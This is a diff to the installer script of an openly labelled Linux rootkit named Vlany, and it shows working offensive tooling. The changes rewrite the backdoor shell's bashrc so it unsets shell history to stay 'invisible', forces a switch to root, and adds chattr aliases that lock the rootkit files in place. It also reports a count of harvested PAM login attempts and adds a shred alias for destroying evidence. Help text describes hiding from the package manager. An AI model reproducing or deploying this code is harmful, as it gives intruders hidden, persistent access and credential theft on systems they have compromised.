@@ -125,35 +125,28 @@ PAM_DEBUG = False
 VERBOSE_DEBUG = False
 
 SHELL_MSG = """
-\033[1m
-
-           *             ,
-                       _/^\_
-                      <     >
-     *                 /.-.\         *
-              *        `/&\`                   *
-                      ,@.*;@,
-                     /_o.I %_\    *
-        *           (`'--:o(_@;
-                   /`;--.,__ `')             *
-                  ;@`o % O,*`'`&\ 
-            *    (`'--)_@ ;o %'()\      *
-                 /`;--._`''--._O'@;
-                /&*,()~o`;-.,_ `""`)
-     *          /`,@ ;+& () o*`;-';\\
-               (`""--.,_0 +% @' &()\\
-               /-.,_    ``''--....-'`)  *
-          *    /@%;o`:;'--,.__   __.'\\
-              ;*,&(); @ % &^;~`"`o;@();         *
-              /(); o^~; & ().o@*&`;&%O\\
-        jgs   `"="==""==,,,.,="=="==="`
-           __.----.(\-''#####---...___...-----._
-         '`         \)_`\"\"\"\"\"`
-                 .--' ')
-               o(  )_-\
-                 `\"\"\"` `
-
-                  Merry Christmas!
+\033[1m                                                                                
+                                                                                
+                                   `::-.                                        
+                                   `+sss:   `````                               
+                           `.--:-```:mMMo .osoooy/`                             
+                       `-/oshhdddhy//mMMy`yNNm//yho/:-``                        
+             `.-:-..--:oyysshmmNmmdmhsNNh.dNNh.oNMNhoo/ss/.                     
+        `-//:+hddy/oo+dms/ohmMNNmdyso+yhhohdmosNNNmy///osyo:.                   
+  `+o/-/yhh+-::---...:hmdshmNMMNhyshddmmdy+ooohNNdmNNds+/:-oh:`                 
+   ./+/os+/:::::::/::+hhyhdmNNNmhsoshssso+yydhydmhoydy/++:ohdy+/.               
+                ``-ys:---:/oydddh//ohhddmdsshy/+dh+:+.```-/sdmhs+`              
+                 `omy`   `..:+oshdhhmNNmmh+/+ho+o//ydo.`````./o/:s:`            
+                 -hd.``..-::::-/yhh+ohhhyysooohmd+/+s+::-.`   ``.+hho.          
+              -ohh+:-::-..``` `-/+/`.-//+sdmdsohs+/:::hds-.`      `/oos/.       
+             `++/-.```         :h+`   `.-:shyo:/hdo//-:sdo`         `-ohh/      
+                              -hm:    `...:++/``hNh-`  `..             `.`      
+                              ohy`  ```    -dy..:yh-                            
+                             `yh:-:-`      /mm-``.`                             
+                             /Nm/.`        -yy/```                              
+                             .o-`           -md+`                               
+                                             -dm-                               
+                                               .
 \033[0m"""
 
 HELP_MSG = """\033[1m// execve commands\033[0m
@@ -356,12 +349,11 @@ def const_h_setup():
     open("symbols/headers/const.h", "w").write(const_h)
 
 def bash_rc_setup():
-    bash_rc = """if ! tty -s ; then return ; fi
+    bash_rc = """[ -z $TERM ] && export TERM=xterm
+tty -s || return
 unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND # WE'RE SUPPOSED TO BE INVISIBLE, DAN
-if [ $(id -u) != 0 ]; then su root; fi
-if [ $(id -u) != 0 ]; then kill -9 $$; fi
-[ -z $TERM ] && export TERM=xterm
-if [ -f "README" ]; then cat README | less; rm -f README; fi
+[ $(id -u) != 0 ] && su root || kill -9 $$
+[ -f "README" ] && { cat README | less; rm -f README; }
 
 clear
 cat ~/.shell_msg
@@ -382,10 +374,11 @@ alias yum=apt-get
 alias emerge=apt-get
 alias pacman=apt-get
 
-alias unchattr='cd {0}; chattr -ia .* * &>/dev/null; echo "chattr permissions removed on rootkit files"'
-alias rechattr='cd {0}; chattr +ia .* * &>/dev/null; echo "rootkit files chattr permissions reinstated"'
+alias unchattr='cd {0}; chattr -ia * &>/dev/null; echo "chattr permissions removed on rootkit files"'
+alias rechattr='cd {0}; chattr +ia * &>/dev/null; echo "rootkit files chattr permissions reinstated"'
 
 echo -e "\\033[1mLogged login attempts: \\033[1;31m$(grep Username ~/pam_auth_logs 2>/dev/null | wc -l)\\033[0m"
+[ -f `which shred 2>/dev/null || echo "NO"` ] && { alias vshred='shred -n 5 --random-source=/dev/urandom -uvz'; echo "shred is available on this box. `alias vshred` made."; }
 """
     fd = open("bashrc", "w")
     fd.write(bash_rc.format(INSTALL))
@@ -397,7 +390,7 @@ echo -e "\\033[1mLogged login attempts: \\033[1;31m$(grep Username ~/pam_auth_lo
 
     BD_README = """
 ██╗   ██╗██╗      █████╗ ███╗   ██╗██╗   ██╗
-██║   ██║██║     ██╔══██╗████╗  ██║╚██╗ ██╔╝
+██║   ██║██║     ██╔══██╗████╗  ██║╚██╗ ██╔╝  
 ██║   ██║██║     ███████║██╔██╗ ██║ ╚████╔╝
 ╚██╗ ██╔╝██║     ██╔══██║██║╚██╗██║  ╚██╔╝
  ╚████╔╝ ███████╗██║  ██║██║ ╚████║   ██║
@@ -425,7 +418,7 @@ A breakdown of how the command works:
     use apt-get without FUCKING everything up
     set gid back to original gid & rehide
     cd back to previous directory
-Using this, you can also create your own scripts to do the same thing for other package managers such as emerge (Gentoo) or yum (Fedora).
+Using this, you can also create your own scripts to do the same thing for other package managers such as emerge or yum.
 
 Rootkit shared object file:
     This is located in your hidden directory. DO NOT remove it. If you do, ld will throw a shit bunch of errors your way. That's bad.
